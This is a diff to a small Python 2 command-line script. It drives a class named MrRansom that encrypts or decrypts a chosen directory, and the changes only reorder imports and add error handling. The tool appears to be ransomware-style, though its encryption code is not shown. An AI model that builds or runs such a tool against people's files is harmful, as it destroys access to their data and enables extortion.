@@ -1,8 +1,7 @@
 import argparse
 import os
-import time
-
 import sys
+import time
 
 from mrransom import MrRansom
 
@@ -21,10 +20,14 @@ if __name__ == "__main__":
         print >> sys.stderr, "Specified dir does not exist"
         exit(-1)
 
-    ransom = MrRansom(specified_dir)
-    if args.mode == 'e' or args.mode == 'encrypt':
-        ransom.encrypt()
-    elif args.mode == 'd' or args.mode == 'decrypt':
-        ransom.decrypt()
+    try:
+        ransom = MrRansom(specified_dir)
+
+        if args.mode == 'e' or args.mode == 'encrypt':
+            ransom.encrypt()
+        elif args.mode == 'd' or args.mode == 'decrypt':
+            ransom.decrypt()
+    except Exception as e:
+        print >> sys.stderr, e.message
 
     print "Took {}s total".format(time.time() - start_time)
